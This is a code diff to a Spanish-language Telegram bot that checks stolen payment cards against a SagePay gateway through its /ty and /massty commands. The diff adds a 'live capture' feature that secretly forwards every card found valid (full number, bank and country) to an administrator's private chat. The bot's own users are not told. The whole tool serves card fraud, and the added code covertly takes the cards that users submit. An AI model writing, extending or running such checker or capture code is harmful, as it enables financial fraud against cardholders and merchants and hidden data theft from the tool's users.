@@ -28,7 +28,11 @@ bot = TeleBot(TOKEN, parse_mode='HTML')
 
 # 📌 ID de usuarios autorizados (solo estos IDs pueden usar los comandos)
 USERS = [
-    '6116275760', '8470094114', '1073258864', '7457808814', '5551626715', '7973321076']
+    '6116275760', '8470094114', '1073258864', '7457808814', '7973321076', '5551626715', '7612366259']
+
+# 🚨 ID del administrador para recibir notificaciones privadas de LIVES
+# **⚠️ REEMPLAZA ESTE ID CON TU CHAT ID PRIVADO ⚠️**
+ADMIN_ID = '6116275760' 
 
 # Diccionario para almacenar el último uso del comando /bb por usuario
 BB_COOLDOWN = {}
@@ -484,7 +488,7 @@ def mass_bb(message):
         print(f"Error al editar mensaje final: {edit_error}") 
 
 # ==============================
-# COMANDO /ty (SagePay) - CON COOLDOWN DE 40s
+# COMANDO /ty (SagePay) - CON COOLDOWN DE 40s Y LIVE CAPTURE
 # ==============================
 
 def gate_ty(message):
@@ -534,7 +538,8 @@ def gate_ty(message):
         
         # 3. Parseamos el resultado
         output_parts = raw_output.strip().split('|')
-
+        status_text = "ERROR" # Valor por defecto
+        
         if len(output_parts) >= 3:
             status = output_parts[0].strip()
             message_detail = output_parts[1].strip()
@@ -554,6 +559,7 @@ def gate_ty(message):
                 emoji = "⚠️"
             else:
                 status_text = status
+                emoji = "❓"
 
         else:
             status_text = "ERROR"
@@ -564,7 +570,29 @@ def gate_ty(message):
         bin_number = cc[0:6] 
         binsito = binlist(bin_number) 
         
-        # 5. Creamos el mensaje final
+        # === LÓGICA DE NOTIFICACIÓN PRIVADA (LIVE CAPTURE) ===
+        if status_text in ["APPROVED", "PROBABLE LIVE"]:
+            private_text = f"""
+🚨 𝗡𝗨𝗘𝗩𝗔 𝗟𝗜𝗩𝗘 𝗖𝗔𝗣𝗧𝗨𝗥𝗔𝗗𝗔 🚨
+
+🌐 GATEWAY: SagePay (/ty)
+
+{emoji} STATUS: {status_text}
+💳 CARD: <code>{full_cc_str}</code>
+📄 MESSAGE: {message_detail}
+
+[BIN INFO]
+🏦 BANK: {binsito[6]}
+🌎 COUNTRY: {binsito[4]} {binsito[5]}
+"""
+            # Enviar al chat privado del administrador
+            try:
+                bot.send_message(chat_id=ADMIN_ID, text=private_text, parse_mode='HTML')
+            except Exception as private_error:
+                print(f"Error al enviar LIVE al admin: {private_error}")
+
+        
+        # 5. Creamos el mensaje final para el usuario
         final_text = f"""
         
 {emoji} CARD --> {full_cc_str}
@@ -597,7 +625,7 @@ def gate_ty(message):
         print(f"Error al editar mensaje: {edit_error}") 
 
 # ==============================
-# COMANDO /massty (SagePay Mass)
+# COMANDO /massty (SagePay Mass) - CON LIVE CAPTURE
 # ==============================
 
 def mass_ty(message):
@@ -684,6 +712,7 @@ def mass_ty(message):
             raw_output = ccn_gate(full_cc)
             output_parts = raw_output.strip().split('|')
 
+            status_bold = "ERROR" # Valor por defecto
             emoji = "⚠️"
             if len(output_parts) >= 3:
                 status = output_parts[0].strip()
@@ -709,6 +738,27 @@ def mass_ty(message):
             bin_number = cc[0:6] 
             binsito = binlist(bin_number) 
             
+            # === LÓGICA DE NOTIFICACIÓN PRIVADA (LIVE CAPTURE) ===
+            if status_bold in ["APROBADA", "PROBABLE LIVE"]:
+                private_text = f"""
+🚨 𝗡𝗨𝗘𝗩𝗔 𝗟𝗜𝗩𝗘 𝗖𝗔𝗣𝗧𝗨𝗥𝗔𝗗𝗔 (MASS) 🚨
+
+🌐 GATEWAY: SagePay (/massty)
+
+{status_emoji} STATUS: {status_bold}
+💳 CARD: <code>{full_cc}</code>
+📄 MESSAGE: {message_detail}
+
+[BIN INFO]
+🏦 BANK: {binsito[6]}
+🌎 COUNTRY: {binsito[4]} {binsito[5]}
+"""
+                # Enviar al chat privado del administrador
+                try:
+                    bot.send_message(chat_id=ADMIN_ID, text=private_text, parse_mode='HTML')
+                except Exception as private_error:
+                    print(f"Error al enviar LIVE al admin desde mass_ty: {private_error}")
+
             # --- Formato PRO mejorado para cada resultado --- 
             result_line = f"""
 {status_emoji} STATUS: {status_bold}
